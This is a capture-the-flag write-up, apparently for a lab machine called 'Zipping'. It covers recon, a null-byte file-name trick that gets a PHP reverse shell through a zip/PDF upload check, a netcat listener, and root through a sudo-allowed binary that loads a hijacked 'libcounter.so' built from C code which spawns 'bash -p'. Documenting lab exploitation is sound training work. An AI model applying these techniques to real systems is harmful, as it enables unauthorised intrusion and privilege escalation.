# Zipping notes

## Recon
```bash
22/tcp open  ssh
80/tcp open  http

/upload.php
```

## File upload

The file upload accepts a `.zip` file. In that zip file it only accepts a single `.pdf` file.
    -> This could be exploited by just renaming files + using null bytes in file names to ignore file restrictions.

Possible solutions:
- `rev.php%00.pdf`
- `rev.phpx00.pdf` -> correct

Solution:
```bash
zip mal.zip "rev.phpX.pdf"
```

Now use `hexedit` on the zip to replace the "X" (x58) in `rev.phpX.pdf` with "00" (x00).

Uploading this zip file with the reverse php shell using a nullbyte string to bypass the `.pdf` restriction works.

(Make sure to setup a netcat listener to catch the shell.)
```bash
nc -lvnp 9001
```

**User: rektsu**

## Getting root

A quick lookup of what processes have root access gives 1 hit:
```bash
sudo -l

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

Ok so the binary file `/usr/bin/stock` can be run as root.

### Analyzing the binary

To see how this binary works, use the `strings` command to get an insight.
```bash
strings /usr/bin/stock
```

**Pass: St0ckM4nager**

Now to analyze the binary further, use the `strace` command to follow the binary flow. When prompted for a password, provide the found password as argument and get an interesting return:
```bash
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

Bingo, find a way to craft a `libcounter.so` file so that it gives a root shell.

### Malicious file

Ok after researching what exactly a `.so` file is and how it works. We will have to create a `C` file which then needs to be compiled. Then find a way to execute the `libcounter.so` after the binary is exited. This way we can get a working shell as the root user.

Create the file `exploit.c`:
```C
#include <unistd.h>

void main (void) __attribute__((destructor));

void main (void) {
    system("bash -p");
}
```

Compiling it will create the `libcounter.so` file:
```
gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC exploit.c
```

Running the `stock` binary as root will now execute the newly created `libcounter.so`:
```bash
rektsu@zipping:/home/rektsu$ sudo stock

St0ckM4nager

3

whoami
root
```

Voila.

## Remarks

- Bashed my head against the `.pdf` extension requirement -> only the last "rev.phpX.pdf" needs to be edited.
- First time working with **C**, a lot of looking up and trial&error.
